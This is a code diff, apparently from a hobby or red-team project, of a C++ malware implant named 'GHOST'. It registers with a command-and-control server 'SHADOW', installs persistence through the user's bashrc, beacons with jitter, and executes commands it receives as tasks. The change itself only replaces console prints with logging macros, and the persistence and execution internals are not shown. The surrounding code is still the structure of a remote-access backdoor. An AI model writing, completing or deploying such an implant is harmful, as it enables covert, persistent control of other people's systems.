@@ -1,4 +1,3 @@
-#include <iostream>
 #include <string>
 #include <vector>
 #include <thread>
@@ -35,7 +34,7 @@ public:
         currentJitterPercent(JITTER_PERCENT) {}
 
     bool registerGhost() {
-        std::cout << "[GHOST] trying to register with SHADOW\n";
+        LOG_INFO("Trying to register with SHADOW")
 
         GhostDto registrationPayload;
         registrationPayload.id = uuid;
@@ -47,7 +46,7 @@ public:
         // TODO: ideally get back some sort of a config, but for now just get any data
         // TODO: make this check the reponse code instead
         if (!response.empty()) {
-            std::cout << "REGISTRATION SUCCESSFUL\n";
+            LOG_SUCCESS("REGISTRATION SUCCESSFUL")
             return true;
         }
 
@@ -58,19 +57,19 @@ public:
         // TOOD: chose from different persistence methods/try them one-by-one
         // TODO: parametrize for builder
         if (Persistence::bashrc() == 0) {
-            std::cout << "[!] GHOST persisted\n";
+            LOG_SUCCESS("Persistence established")
 
             return;
         }
 
-        std::cout << "ERROR with persistence\n";
+        LOG_ERROR("Persistence failed")
     }
 
     void beacon() {
-        std::cout << "[GHOST] starting the beacon\n";
+        LOG_INFO("Starting beacon")
 
         while (true) {
-            std::cout << "[beacon] pulse sent\n";
+            LOG_INFO("[BEACON] Heartbeat sent")
             
             HeartbeatRequestDto heartbeat;
             heartbeat.id = uuid;
@@ -92,14 +91,14 @@ public:
                 }
 
                 if (!instructions.tasks.empty()) {
-                    std::cout << "RECEIVED " << instructions.tasks.size() << " tasks\n";
+                    LOG_INFO("Received {} tasks", instructions.tasks.size())
 
                     for (const auto& task : instructions.tasks) {
                         processTask(task);
                     }
                 }
             } else {
-                std::cout << "ERROR connection failed or empty response\n";
+                LOG_ERROR("Response was empty")
             }
 
             sleepWithJitter();
@@ -108,7 +107,7 @@ public:
 
 private:
     void processTask(const TaskDefinitionDto& task) {
-        std::cout << "GHOST executing task " << task.command << "\n";
+        LOG_INFO("Executing task {}: {}", task.id, task.command)
 
         TaskResultDto result;
         result.taskId = task.id;
@@ -135,7 +134,7 @@ private:
 int main() {
     srand(time(0));
 
-    std::cout << "GHOST UP on \"" << OS_PLATFORM << "\"" << std::endl;
+    LOG_SUCCESS("GHOST up on {}", OS_PLATFORM)
 
     Ghost ghost(SHADOW_IP, SHADOW_PORT);
 
